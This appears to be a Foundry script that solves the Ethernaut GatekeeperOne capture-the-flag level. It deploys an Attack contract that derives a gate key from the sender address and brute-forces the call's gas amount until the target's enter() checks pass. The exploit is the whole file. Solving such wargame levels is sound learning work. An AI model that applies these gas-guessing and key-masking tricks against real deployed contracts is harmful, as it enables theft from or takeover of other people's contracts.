// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/GatekeeperOne.sol";

contract GatekeeperOneScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        Attack a = new Attack();
        a.a();

        vm.stopBroadcast();
    }
}

contract Attack {

    GatekeeperOne target;
    constructor() {
        target = GatekeeperOne(0xb0b55343b6bbf16e3377298D1947BBa48305998A);
    }
    
    function a() external {
        bytes8 gateKey = bytes8(uint64(uint160(msg.sender))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 1; i < 100; i++) {
            (bool success, ) = address(target).call{gas: 8191*5+i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            console.log("success: ", success);
            if (success) return;
        }
    }

}